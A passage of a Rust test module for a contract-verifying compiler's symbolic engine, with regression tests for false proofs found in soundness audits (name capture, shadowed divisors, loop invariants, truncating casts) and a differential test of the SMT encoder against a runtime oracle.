        // REGRESSION — critical false-proof (soundness audit 2026-07-11). Contract composition
        // substitutes the callee's params/`result` into its contract; `substitute_vars` MUST descend
        // into the abs/min/max builtin Call. Before the fix it did not, so a callee param inside
        // `abs(x)` survived un-substituted and re-bound to the CALLER's scope — a NAME CAPTURE.
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // requires-side precondition BYPASS: `g(150)` against `requires(abs(x) < 100)` was checked as
        // `abs(5) < 100` (caller's `let x = 5`), so `outer`'s ensures was "proved" while g(150) = 150.
        assert!(
            !discharged(
                "fn g(x: u32) -> u32 requires(abs(x) < 100) ensures(result == abs(x)) { return abs(x); } \
                 fn outer() -> u32 ensures(result == 5) { let x = 5; let r = g(150); return r; }"
            ),
            "g(150) violates requires(abs(x) < 100); outer's ensures(result == 5) must NOT be provable"
        );
        // ensures-side name capture: `ensures(result == abs(x))` bound `x` to the caller's `let x = 7`.
        assert!(
            !discharged(
                "fn g(x: u32) -> u32 requires(x >= 0) requires(x < 100) ensures(result == abs(x)) { return x; } \
                 fn outer() -> u32 ensures(result == 7) { let x = 7; let r = g(3); return r; }"
            ),
            "g(3) returns 3, not abs(caller's x=7); outer's ensures(result == 7) must NOT be provable"
        );
        // The fix does not over-reject: a VALID call whose argument satisfies the specialized
        // precondition still composes and proves.
        assert!(
            discharged(
                "fn g(x: u32) -> u32 requires(abs(x) < 100) ensures(result == abs(x)) { return abs(x); } \
                 fn outer() -> u32 ensures(result == 50) { let r = g(50); return r; }"
            ),
            "g(50): abs(50) < 100 holds, so ensures(result == abs(50) == 50) composes"
        );
        // Companion (collect_expr_vars must also descend into abs/min/max): an `ensures` over a
        // parameter REASSIGNED in the body is fail-closed even inside a builtin (entry value vs mutated).
        assert!(
            !discharged(
                "fn g(x: u32) -> u32 ensures(result == abs(x)) { x = 0 - 5; return abs(x); }"
            ),
            "ensures(result == abs(x)) with x reassigned must be rejected (no old(); entry value)"
        );
    }

    #[test]
    fn solver_guarded_divisor_respects_loop_shadowing() {
        // REGRESSION — critical false-proof (soundness audit 2026-07-11). A divisor guarded by
        // `requires(n != 0)` earns an nzdiv mark only when the body never rebinds it. A `for`-loop
        // ITERATION VARIABLE that shadows the parameter is a rebind, but `collect_let_bound` used to
        // miss it — so inside `for n in 0..3 { .. }` the mark leaked and `100 / n` was modeled as
        // divide-safe while the loop deterministically sets `n = 0` (a runtime ANUBIS_DIV_BY_ZERO).
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // Discriminator: an obviously-false division equality is DISPROVED (FAIL) only if `100/n` is
        // actually modeled. Non-shadowed, the guard is valid, so it IS modeled and disproved.
        assert!(
            !discharged(
                "fn f(n: i64) -> i64 requires(n != 0) ensures(result <= 100) { assert(100 / n == 999); return 0; }"
            ),
            "non-shadowed guarded divisor is modeled: `100/n == 999` is disproved"
        );
        // Shadowed by a for-loop variable, the mark must be dropped, so `100/n` is NOT modeled — the
        // assert becomes unmodelable and is deferred to the runtime (which traps on n = 0), not proved.
        assert!(
            discharged(
                "fn f(n: i64) -> i64 requires(n != 0) ensures(result <= 100) { for n in 0..3 { assert(100 / n == 999); } return 0; }"
            ),
            "for-loop-shadowed divisor must NOT be modeled (no false proof over a trapping divide)"
        );
    }

    #[test]
    fn solver_assume_value_and_builtin_let_binding_soundness() {
        // REGRESSION — fix-adversary re-audit 2026-07-11.
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // RC5 (completeness / false ALARM): a `let` bound to a modeled builtin (abs/min/max) or `~`
        // must emit its defining constraint via `expr_to_smt_value`, else the binding is a FREE var and
        // a valid contract over it is wrongly disproved with an impossible counterexample.
        assert!(
            discharged(
                "fn f(x: u32) -> u32 ensures(result == abs(x)) { let y = abs(x); return y; }"
            ),
            "let y = abs(x) must link y to abs(x) (no false alarm)"
        );
        assert!(
            discharged("fn f(x: u32) -> u32 ensures(result == ~x) { let y = ~x; return y; }"),
            "let y = ~x must link y"
        );
        assert!(
            discharged(
                "fn f(a: u32, b: u32) -> u32 ensures(result == min(a, b)) { let y = min(a, b); return y; }"
            ),
            "let y = min(a,b) must link y"
        );
        // RC7 (false PROOF): `assume(E)`/`assert(E)` in VALUE position evaluate to Bool(true) at
        // runtime, NOT E. So `return assume(x)` must NOT certify `result == x` (it did).
        assert!(
            !discharged("fn f(x: u32) -> u32 ensures(result == x) { return assume(x); }"),
            "return assume(x) must not prove result == x (assume's value is true, not x)"
        );
        assert!(
            !discharged("fn f(x: u32) -> u32 ensures(result == x) { return assert(x); }"),
            "return assert(x) must not prove result == x"
        );
    }

    #[test]
    fn solver_expression_shadow_unsound_assume_and_float_composition() {
        // REGRESSION — fix-adversary re-audit round 3 (2026-07-11). Three root causes, all "the checker
        // and the dynamic runtime disagree", each fixed COMPLETELY (prior point-fixes missed variants).
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // A — a parameter shadowed by a binder in EXPRESSION position (match-arm / if-let) must enter
        // the rebind set (collect_let_bound now walks expressions), else the guarded-divisor nzdiv mark
        // survives / the shadowed-param `ensures` is laundered. `match 2 { n => 6/n }` rebinds n to 2.
        assert!(
            !discharged("fn f(n: i64) -> i64 requires(n != 0) ensures(result == 6 / n) { match 2 { n => 6 / n } }"),
            "match-arm shadow of a guarded divisor must be fail-closed"
        );
        assert!(
            !discharged("fn f(n: i64) -> i64 requires(n > 0) ensures(result >= 0) { match (0 - 3) { n => 6 / n } }"),
            "match-arm shadow, safety postcondition"
        );
        assert!(
            !discharged("fn f(x: i64) -> i64 requires(x >= 0) ensures(result == x) { if let x = 33 { return x; } else { return x; } }"),
            "if-let shadow of a contract parameter"
        );
        // B — a truncating cast inside `assume` has no sound i64 identity, so the solver must NOT trust
        // it (assume is now gated on modelability, like assert). `assume((x as u8) == 0)` holds at
        // runtime for x = 256, so trusting it as `x == 0` certified `result == 0` while f(256) = 256.
        assert!(
            !discharged(
                "fn f(x: u32) -> u32 ensures(result == 0) { assume((x as u8) == 0); return x; }"
            ),
            "truncating cast inside assume must not be trusted"
        );
        // C — a call-result binding is modeled as a solver integer ONLY if the callee DECLARES an
        // integer return type; a float-returning callee must not seed a float into the integer domain.
        assert!(
            !discharged("fn frac(a: u32) -> f64 requires(a > 0) ensures(a > 0) { return 0.5; } fn g(a: u32) -> f64 requires(a > 0) ensures(result == 0) { let na = frac(a); return na; }"),
            "f64-returning callee must not be modeled as int in composition"
        );
        // The fixes do not over-reject: a valid integer composition and a non-shadowing guarded divisor
        // still prove.
        assert!(
            discharged("fn sq(x: u32) -> u32 ensures(result == x * x) { return x * x; } fn g() -> u32 { let s = sq(5); return s; }"),
            "valid integer composition still proves"
        );
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(n != 0) ensures(result <= 6) { return 6 / n; }"
            ),
            "valid guarded divisor still proves"
        );
    }

    #[test]
    fn differential_solver_encoder_matches_runtime_oracle() {
        // The standing regression net (Phase-4 B3): generate random CONCRETE modelable integer
        // expressions and assert the SMT encoder computes exactly what the i64 runtime does. This is
        // the automation of the manual solver-vs-runtime probes — it catches encoder mismodeling of
        // any operator (the `bvashr`-vs-`bvlshr`, `bvsrem`-vs-`bvsmod`, shift-mask, wrap bug class)
        // across all op COMBINATIONS, deterministically (a failure reprints the exact expression).
        //
        // Oracle = a pure-i64 evaluator mirroring compiler/src/backends/run.rs EXACTLY. If the encoder
        // and oracle ever disagree, P1 (`ensures(result == oracle)`) fails to discharge -> red test.
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // Deterministic LCG (no Date/rand): reproducible failures.
        struct Lcg(u64);
        impl Lcg {
            fn next(&mut self) -> u64 {
                self.0 = self
                    .0
                    .wrapping_mul(6364136223846793005)
                    .wrapping_add(1442695040888963407);
                self.0 >> 11
            }
            fn below(&mut self, n: usize) -> usize {
                (self.next() as usize) % n
            }
        }
        // A boundary-heavy value pool (wrap edges, shift edges, signs, zero).
        let pool: [i64; 16] = [
            0,
            1,
            2,
            3,
            7,
            -1,
            -2,
            -7,
            100,
            -100,
            63,
            64,
            65,
            i64::MAX,
            i64::MIN,
            i64::MIN + 1,
        ];
        // Emit an Anubis integer literal (negatives as `(0 - k)`; i64::MIN specially since |MIN| overflows).
        fn lit(v: i64) -> String {
            if v == i64::MIN {
                "(0 - 9223372036854775807 - 1)".to_string()
            } else if v < 0 {
                format!("(0 - {})", -v)
            } else {
                v.to_string()
            }
        }
        // Build (source, oracle_value) for a random modelable expression of the given depth.
        fn build(rng: &mut Lcg, depth: u32, pool: &[i64]) -> (String, i64) {
            if depth == 0 || rng.below(3) == 0 {
                let v = pool[rng.below(pool.len())];
                return (lit(v), v);
            }
            // 0..=12 operator classes; each mirrors run.rs semantics in the oracle.
            match rng.below(13) {
                0 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("({ls} + {rs})"), lv.wrapping_add(rv))
                }
                1 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("({ls} - {rs})"), lv.wrapping_sub(rv))
                }
                2 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("({ls} * {rs})"), lv.wrapping_mul(rv))
                }
                3 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("({ls} & {rs})"), lv & rv)
                }
                4 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("({ls} | {rs})"), lv | rv)
                }
                5 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("({ls} ^ {rs})"), lv ^ rv)
                }
                6 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    let s = (rv.rem_euclid(64)) as u32;
                    (format!("({ls} << {rs})"), lv.wrapping_shl(s))
                }
                7 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    let s = (rv.rem_euclid(64)) as u32;
                    (format!("({ls} >> {rs})"), lv.wrapping_shr(s)) // ARITHMETIC (bvashr)
                }
                8 => {
                    let (es, ev) = build(rng, depth - 1, pool);
                    (format!("(0 - {es})"), ev.wrapping_neg())
                }
                9 => {
                    let (es, ev) = build(rng, depth - 1, pool);
                    (format!("~({es})"), !ev)
                }
                10 => {
                    let (es, ev) = build(rng, depth - 1, pool);
                    (format!("abs({es})"), ev.wrapping_abs())
                }
                11 => {
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let (rs, rv) = build(rng, depth - 1, pool);
                    (format!("min({ls}, {rs})"), lv.min(rv))
                }
                _ => {
                    // `/` and `%` are modelable ONLY with a non-zero POSITIVE integer LITERAL divisor:
                    // `is_nonzero_int_literal` matches `Expr::Literal`, and a negative literal prints as
                    // `(0 - k)` (a Binary, not a Literal) so it is (correctly) unmodelable. Keep the
                    // divisor a bare positive literal so every generated expression stays modelable.
                    let (ls, lv) = build(rng, depth - 1, pool);
                    let mut d = pool[rng.below(pool.len())];
                    if d <= 0 {
                        d = d.wrapping_neg();
                    }
                    if d <= 0 {
                        d = 1; // i64::MIN.wrapping_neg() is still negative
                    }
                    if rng.below(2) == 0 {
                        (format!("({ls} / {d})"), lv.wrapping_div(d))
                    } else {
                        (format!("({ls} % {d})"), lv.wrapping_rem(d))
                    }
                }
            }
        }
        let mut rng = Lcg(0x0da4_1e5c_9f37_b201);
        for i in 0..1500 {
            let (src, oracle) = build(&mut rng, 3, &pool);
            let prog_true = format!(
                "fn f() -> u32 ensures(result == {}) {{ return {}; }}",
                lit(oracle),
                src
            );
            // P1: the encoder must AGREE with the oracle — `result == oracle` is provable.
            assert!(
                discharged(&prog_true),
                "iter {i}: encoder disagrees with runtime oracle ({oracle}) for `{src}`"
            );
            // P2: the modeling is REAL, not vacuous — a deliberately-wrong value is disproved.
            let wrong = oracle.wrapping_add(1);
            let prog_false = format!(
                "fn f() -> u32 ensures(result == {}) {{ return {}; }}",
                lit(wrong),
                src
            );
            assert!(
                !discharged(&prog_false),
                "iter {i}: encoder vacuously accepted wrong value {wrong} for `{src}` (oracle {oracle})"
            );
        }
    }

    #[test]
    fn solver_modelability_is_function_local_and_shadow_safe() {
        // Solver integer-modelability must be FUNCTION-LOCAL and invalidated on a shadowing `let`.
        // Otherwise a name modeled as an i64 in one place leaks its modelability to a same-named
        // binding holding a string/list/bool, and an integer predicate over it is "proved" (a
        // bit-vector tautology like `v + 0 == v`) though the runtime string/list semantics differ.
        let checks_pass =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        // A shadowing `let` must drop the shadowed integer's model: a genuinely-false integer assert
        // over the new (string) binding must NOT be disproved from the stale `v == 0` — it is skipped
        // (deferred to runtime). If the model leaked, `assert(v == 99)` would be DISPROVED (FAIL).
        assert!(
            checks_pass("fn main() { let v = 0; let v = \"hello\"; assert(v == 99); }"),
            "a shadowing string `let` must drop the shadowed integer's model (no stale disproof)"
        );
        // The cross-function leak: a helper that models `s` as an integer must not make another
        // function's `s` param modelable. Here `f`'s `ensures(result == s + 0)` over an untyped/string
        // param must fail closed (rejected), not be certified via a leaked integer model.
        assert!(
            !checks_pass("fn poison() { let s = 0; print(s); } fn f(s) -> i64 ensures(result == s + 0) { return s; }"),
            "integer-modelability must not leak across function boundaries"
        );
        // Control: a genuine same-function integer let is still modeled and provable.
        assert!(
            checks_pass("fn main() { let x = 7; let y = x * 6; assert(y == 42); }"),
            "a genuine integer let chain still proves"
        );
        // Truncating-cast fact leak (adversarial-sweep round 14): `let y = x as u8` recorded a false
        // `y == x` fact that a loop invariant force-modeling `y` could "prove" against the
        // pre-truncation value. `y = 300 as u8 == 44` at runtime, so `invariant(y == 300)` is false.
        assert!(
            !checks_pass("fn main() { let x = 300; let y = x as u8; let mut i = 0; while i < 0 invariant(y == 300) { i = i + 1; } assert(y == 300); }"),
            "a truncating-cast binding must not record an identity fact a loop invariant can force-model"
        );
        // Control: a value-preserving cast (`as i64`) keeps the inner's value.
        assert!(
            checks_pass("fn main() { let x = 5; let y = x as i64; assert(y == 5); }"),
            "a value-preserving cast keeps the inner integer value"
        );
    }

    #[test]
    fn loop_body_assert_not_discharged_against_stale_state() {
        // An `assert` inside a loop body must NOT be proved OR disproved from the PRE-LOOP value of a
        // variable the loop mutates each iteration — that value is stale the moment the loop runs. The
        // loop-written variables are havoc'd before the body, so such an assert is deferred to the
        // runtime (which enforces `assert`). An assert over a read-only variable stays statically
        // checked.
        let checks_pass =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        // Was a false DISPROOF from the stale `x == 0` (`0 > 100` is false); now skipped (deferred).
        // The complementary false PROOF (`assert(x < 2)` "proved" from `x == 0`) is closed by the same
        // havoc — the obligation is no longer emitted at all.
        assert!(
            checks_pass("fn main() { let mut x = 0; let mut i = 0; while i < 3 { assert(x > 100); x = x + 1; i = i + 1; } }"),
            "an in-body assert over a loop-written variable must not be discharged from its stale pre-loop value"
        );
        // A read-only variable inside the loop is NOT havoc'd, so a genuinely-false assert over it is
        // still disproved, and a true one still proves.
        assert!(
            !checks_pass("fn main() { let c = 5; let mut i = 0; while i < 3 { assert(c == 9); i = i + 1; } }"),
            "an in-body assert over an unmodified variable is still statically checked (c==9 is false)"
        );
        assert!(
            checks_pass("fn main() { let c = 5; let mut i = 0; while i < 3 { assert(c == 5); i = i + 1; } }"),
            "a true in-body assert over an unmodified variable proves"
        );
    }

    #[test]
    fn solver_invalidates_embedded_control_flow_writes() {
        // SOUNDNESS: a write EMBEDDED in a `match`-arm / `if`-expression / block escapes the
        // statement-level frame sweep (which only visits Stmt::If/While/... bodies), so the reassigned
        // variable's stale `let`/reassignment fact must be invalidated at the enclosing statement — else a
        // later `ensures` is discharged against a value the runtime has moved past. `leaki(0)` returns 100,
        // so `ensures(result == 2)` is violable and must be REJECTED (ANUBIS_CONTRACT_UNPROVABLE — the
        // written var becomes unmodeled, a typecheck-surfaced diagnostic).
        let err = tc_ok(
            "fn leaki(c: i64) -> i64 ensures(result == 2) \
             { let y = 2; match c { 0 => { y = 100; } _ => {} } return y; }\n\
             fn main() { let r = leaki(0); }",
        )
        .expect_err("a match-arm reassignment must not certify a violable contract");
        assert!(
            err.contains("ANUBIS_CONTRACT_UNPROVABLE"),
            "match-arm embedded-write leak — got: {err}"
        );
        // Same leak via a value-position `if`-expression used as a `let` initializer.
        let err = tc_ok(
            "fn leak2(c: i64) -> i64 ensures(result == 2) \
             { let y = 2; let z = if c == 0 { y = 100; 0 } else { 0 }; return y; }\n\
             fn main() { let r = leak2(0); }",
        )
        .expect_err("an if-initializer embedded write must not certify a violable contract");
        assert!(
            err.contains("ANUBIS_CONTRACT_UNPROVABLE"),
            "if-initializer embedded-write leak — got: {err}"
        );
        // A STRAIGHT-LINE reassignment is still soundly re-established (the `i = 0;` reset pattern is
        // handled by the Stmt::Assign arm, NOT invalidated) — this valid contract still discharges.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        assert!(
            discharged(
                "fn f() -> i64 ensures(result == 0) { let mut y = 5; y = 0; return y; }\n\
                 fn main() { let r = f(); }"
            ),
            "a straight-line reassignment must still re-establish and discharge"
        );
    }

    #[test]
    fn undecided_loop_invariant_step_fails_closed() {
        // A z3 `unknown` (undecided within the time budget — NOT disproved) on ANY proof-carrying
        // obligation must fail closed. The loop-invariant PRESERVATION step is deliberately excluded from
        // the separate vacuity check (a loop whose invariant implies ¬cond never iterates), but it must
        // still be in the undecided-verdict set — else a timed-out step silently admits a possibly-false
        // invariant (a fail-open gap the adversarial hunt flagged). This asserts the predicate directly
        // (a genuine z3 `unknown` is non-deterministic — it needs a per-query timeout — so the LOGIC is
        // tested here rather than via a flaky timing-dependent program).
        use middle::obligation_undecided_is_unsound as undecided;
        assert!(undecided("loop-invariant-step:(bvsgt anb_x (_ bv0 64))"), "step must fail closed");
        assert!(undecided("loop-invariant-base:(bvsgt anb_x (_ bv0 64))"), "base");
        assert!(undecided("ensures:(bvsgt anb_result (_ bv0 64))"), "ensures");
        assert!(undecided("requires@f:(bvsgt anb_x (_ bv0 64))"), "requires");
        assert!(undecided("assert:(bvsgt anb_x (_ bv0 64))"), "assert");
        // A non-proof-carrying obligation name is not forced to FAIL on unknown.
        assert!(!undecided("solver"), "a bare solver check is not a contract obligation");
        assert!(!undecided("taint-flow:x"), "an analysis tag is not a contract obligation");
    }

    #[test]
    fn trait_bound_enforced_and_accept_biased() {
        // Phase-1 trait BOUND enforcement (the parser used to discard `T: Bound`). A generic bound to a
        // KNOWN user type whose required trait has no `impl` is rejected; every accept-bias axis holds.
        let base = "trait Comparable { fn cmp(self, other) -> i64; }\nstruct Blob { x: u32 }\n";
        // (reject) Blob lacks `impl Comparable` — direct struct-literal args.
        let err = tc_ok(&format!(
            "{base}fn choose<T: Comparable>(a: T, b: T) -> T {{ a }}\n\
             fn main() {{ let r = choose(Blob {{ x: 1 }}, Blob {{ x: 2 }}); print(r.x); }}"
        ))
        .expect_err("an unsatisfied trait bound on a known user type must be rejected");
        assert!(
            err.contains("ANUBIS_TRAIT_BOUND_UNSATISFIED"),
            "unsatisfied bound — got: {err}"
        );
        // (reject) same via annotated-variable args (the type is pinned by the annotation, not synth).
        let err = tc_ok(&format!(
            "{base}fn choose<T: Comparable>(a: T, b: T) -> T {{ a }}\n\
             fn main() {{ let p: Blob = Blob {{ x: 1 }}; let q: Blob = Blob {{ x: 2 }}; \
             let r = choose(p, q); print(r.x); }}"
        ))
        .expect_err("annotated-var args must also drive the bound check");
        assert!(err.contains("ANUBIS_TRAIT_BOUND_UNSATISFIED"), "got: {err}");
        // (accept) with the impl, the bound is satisfied.
        assert!(
            tc_ok(&format!(
                "{base}impl Comparable for Blob {{ fn cmp(self, other) -> i64 {{ 0 }} }}\n\
                 fn choose<T: Comparable>(a: T, b: T) -> T {{ a }}\n\
                 fn main() {{ let r = choose(Blob {{ x: 1 }}, Blob {{ x: 2 }}); print(r.x); }}"
            ))
            .is_ok(),
            "a satisfied trait bound must be accepted"
        );
        // (accept-bias) a BUILT-IN primitive under the bound is accepted (never demand `impl … for u32`).
        assert!(
            tc_ok("trait Comparable { fn cmp(self, other) -> i64; }\n\
                   fn choose<T: Comparable>(a: T, b: T) -> T { a }\n\
                   fn main() { let r = choose(1, 2); print(r); }")
            .is_ok(),
            "a primitive argument under a trait bound must be accepted (accept-bias)"
        );
        // (accept-bias) an UNBOUNDED generic never fires (parser records no bound).
        assert!(
            tc_ok("struct Blob { x: u32 }\nfn id<T>(a: T) -> T { a }\n\
                   fn main() { let r = id(Blob { x: 1 }); print(r.x); }")
            .is_ok(),
            "an unbounded generic must not trigger the bound check"
        );
    }

    #[test]
    fn solver_closes_control_flow_false_accepts() {
        // Three false accepts an adversarial soundness hunt found (2026-07-15), each a static proof of a
        // runtime-violable contract; all must now REJECT fail-closed.

        // (1) An EARLY return over a REASSIGNED parameter is discharged against the frozen call-entry
        // precondition — `g(5)` returns -100, so `ensures(result > 0)` is false at runtime.
        let err = tc_ok(
            "fn g(x: i64) -> i64 requires(x > 0) ensures(result > 0) \
             { x = 0 - 100; if x < 0 { return x; } return 1; }\n\
             fn h() -> i64 ensures(result > 0) { let z = g(5); return z; }\n\
             fn main() { print(h()); }",
        )
        .expect_err("early return over a reassigned parameter must not launder a false postcondition");
        assert!(
            err.contains("ANUBIS_CONTRACT_UNPROVABLE"),
            "early-return reassigned-param — got: {err}"
        );
        // CONTROL: an early return of a parameter that is NOT reassigned is still provable from `requires`.
        assert!(
            tc_ok(
                "fn g2(x: i64) -> i64 requires(x > 0) ensures(result > 0) \
                 { if x > 0 { return x; } return 1; }\nfn main() { print(g2(5)); }"
            )
            .is_ok(),
            "an early return of an UNmodified parameter must still be accepted"
        );

        // (2) A `break` embedded in a `let` initializer escapes the loop; the invariant engine must not
        // verify a post-loop invariant against a body the break skips.
        let err = tc_ok(
            "fn main() { let mut x = 0; while x < 10 invariant(x <= 10) \
             { let sink = break; x = x + 1; } assert(x == 10); }",
        )
        .expect_err("a break in a let-initializer must make the loop invariant unverifiable");
        assert!(
            err.contains("ANUBIS_LOOP_INVARIANT_UNVERIFIABLE"),
            "break-in-let escape — got: {err}"
        );

        // (3) A write embedded in a `for`-loop range source escapes the frame sweep; `leakfor(0)` returns
        // 100, so `ensures(result == 2)` is violable.
        let err = tc_ok(
            "fn leakfor(c: i64) -> i64 ensures(result == 2) \
             { let y = 2; for i in 0..(match c { 0 => { y = 100; 1 } _ => { 1 } }) { } return y; }\n\
             fn main() { let r = leakfor(0); }",
        )
        .expect_err("a write in a for-loop source must invalidate the stale fact");
        assert!(
            err.contains("ANUBIS_CONTRACT_UNPROVABLE"),
            "for-source embedded write — got: {err}"
        );
    }

    #[test]
    fn b3_loop_invariants_verify_inductively() {
        // B3: a `while` invariant is verified by the Hoare rule (holds on entry AND is preserved by
        // each iteration), then may be assumed after the loop — readmitting a loop-carried variable
        // the solver otherwise drops. `discharged` is false when the program is rejected (a
        // fail-closed diagnostic OR a solver FAIL on the base/step obligation).
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };

        // THE DEMONSTRATION: an `ensures` over a loop-carried variable is UNPROVABLE without an
        // invariant (the variable is dropped when reassigned) but PROVABLE with one.
        assert!(
            !discharged("fn count(n: u32) -> u32 requires(n < 1000000) ensures(result >= 0) { let mut i = 0; while i < n { i = i + 1; } return i; }"),
            "without an invariant, ensures over the loop var must fail closed"
        );
        assert!(
            discharged("fn count(n: u32) -> u32 requires(n < 1000000) ensures(result >= 0) { let mut i = 0; while i < n invariant(i >= 0) { i = i + 1; } return i; }"),
            "with an invariant, the loop var is readmitted and the ensures proves"
        );

        // Base case must hold on entry: `i >= 5` is false when `i` starts at 0.
        assert!(
            !discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result >= 5) { let mut i = 0; while i < n invariant(i >= 5) { i = i + 1; } return i; }"),
            "invariant that fails on entry is rejected (base case)"
        );
        // Preservation must hold: `x >= 5` is not preserved as `x` decrements toward 0.
        assert!(
            !discharged("fn f() -> u32 ensures(result >= 5) { let mut x = 10; while x > 0 invariant(x >= 5) { x = x - 1; } return x; }"),
            "invariant not preserved by the body is rejected (inductive step)"
        );
        // A true-but-non-inductive invariant is rejected (soundness: we require inductiveness).
        assert!(
            !discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result >= 0) { let mut i = 0; while i < n invariant(i == n) { i = i + 1; } return i; }"),
            "non-inductive invariant is rejected"
        );
        // The stale pre-loop value must NOT survive: after a loop that increments `i`, an ensures
        // that `result == 0` must be rejected (the loop changed i).
        assert!(
            !discharged("fn f(n: u32) -> u32 requires(n > 0) requires(n < 100) ensures(result == 0) { let mut i = 0; while i < n invariant(i >= 0) { i = i + 1; } return i; }"),
            "stale pre-loop assumption (i==0) must be dropped after the loop"
        );
        // A false ensures cannot slip through a valid invariant: `result > n` is false (i ends == n).
        assert!(
            !discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result > n) { let mut i = 0; while i < n invariant(i >= 0) { i = i + 1; } return i; }"),
            "a valid invariant must not certify a false postcondition"
        );
        // A branch that writes a loop-carried variable defeats straight-line transition -> rejected.
        assert!(
            !discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result >= 0) { let mut i = 0; while i < n invariant(i >= 0) { if i > 2 { i = i + 2; } i = i + 1; } return i; }"),
            "a branch writing the loop variable is not analyzable -> rejected"
        );
        // `for`/`loop` invariants are honestly rejected (not yet verified) rather than silently used.
        assert!(
            !discharged("fn f(n: u32) -> u32 ensures(result >= 0) { let mut t = 0; for i in 0..n invariant(t >= 0) { t = t + 1; } return t; }"),
            "for-loop invariant is rejected (not yet supported) not silently ignored"
        );

        // Vacuity via the loop (adversarial-sweep false proof): a contradictory pre-loop state
        // (`assume`/`requires`) must NOT launder through the base case to certify a bogus invariant
        // and a false postcondition. `f()` returns 3 at runtime, so `ensures(result == 42)` is false.
        assert!(
            !discharged("fn f() -> u32 ensures(result == 42) { let mut i = 0; assume(i > 5); while i < 3 invariant(i == 42) { i = i + 1; } return i; }"),
            "a contradictory `assume` must not vacuously pass the loop base case (false proof)"
        );
        assert!(
            !discharged("fn f(i: u32) -> u32 requires(i > 5) requires(i < 3) ensures(result == 42) { while i < 3 invariant(i == 42) { i = i + 1; } return i; }"),
            "contradictory `requires` on the loop variable must not vacuously certify a postcondition"
        );
        // The post-loop admit keeps facts about UNMODIFIED variables (frame): `n < 1000` (n is only
        // read, never written) must survive so `result < 2000` proves. (Was a false disproof when the
        // drop keyed on all tracked vars instead of only the modified ones.)
        assert!(
            discharged("fn f(n: u32) -> u32 requires(n < 1000) requires(n > 0) ensures(result < 2000) { let mut i = 0; while i < n invariant(i >= 0) invariant(i <= n) { i = i + 1; } return i; }"),
            "a bound on a loop-invariant (unmodified) variable must survive after the loop"
        );
        // A break/continue/return NESTED in an `if` (adversarial-sweep false proof): the loop can exit
        // while its condition is still true, so the post-loop `¬cond` assumption is unsound and could
        // certify a false ensures. `f()` returns 3 at runtime, so `ensures(result >= 100)` is false.
        assert!(
            !discharged("fn f() -> u32 ensures(result >= 100) { let mut i = 0; while i < 100 invariant(i <= 100) { if i == 3 { break; } i = i + 1; } return i; }"),
            "a nested break must not leave a false post-loop `not cond` assumption (false proof)"
        );
        assert!(
            !discharged("fn f() -> u32 ensures(result >= 100) { let mut i = 0; while i < 100 invariant(i <= 100) { if i == 3 { return i; } i = i + 1; } return i; }"),
            "a nested return in the loop body defeats straight-line analysis -> rejected"
        );
        // B3 v1 scope: an invariant loop body must be a FLAT straight-line sequence. A branch in the
        // body (even a harmless `if { print }`) is conservatively rejected — the robust guard against
        // writes hidden in branches/expressions. (A future layer can admit branch transitions.)
        assert!(
            !discharged("fn f(n: u32) -> u32 requires(n < 100) ensures(result >= 0) { let mut i = 0; while i < n invariant(i >= 0) { if i > 2 { print(i); } i = i + 1; } return i; }"),
            "a branch in an invariant loop body is conservatively rejected (flat-body rule)"
        );
        // AUXILIARY-variable false proof (adversarial-sweep round 3): a variable NOT in the invariant
